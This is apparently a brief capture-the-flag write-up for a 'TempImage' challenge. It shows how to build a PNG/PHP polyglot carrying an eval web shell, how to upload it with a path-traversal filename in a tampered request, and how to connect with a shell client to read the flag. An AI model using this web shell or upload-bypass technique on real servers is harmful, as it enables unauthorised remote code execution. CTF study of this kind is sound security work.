# TempImage - FLAG1

## 0x00 Index

![](../flag0/imgs/index.jpg)

## 0x01 Generate Image Shell

Run bat file [gen_imgshell.bat](./gen_imgshell.bat).

```batch
copy img.png/b + webshell.php shell.png
```

Get shell.png which has the injected code.

```php
<?php @eval($_POST['hacker1'])?>
```

![](./shell.png)

## 0x02 Upload the Image Shell

Catch the request and change the file name.

```
Content-Disposition: form-data; name="filename"

/../../shell.php
```

Shell upload successfully.

![](./imgs/shell_upload.jpg)

## 0x03 Connect Server 

![](./imgs/caidao.jpg)

## 0x04 FLAG

Flag can be found in index.php

![](./imgs/flag.jpg)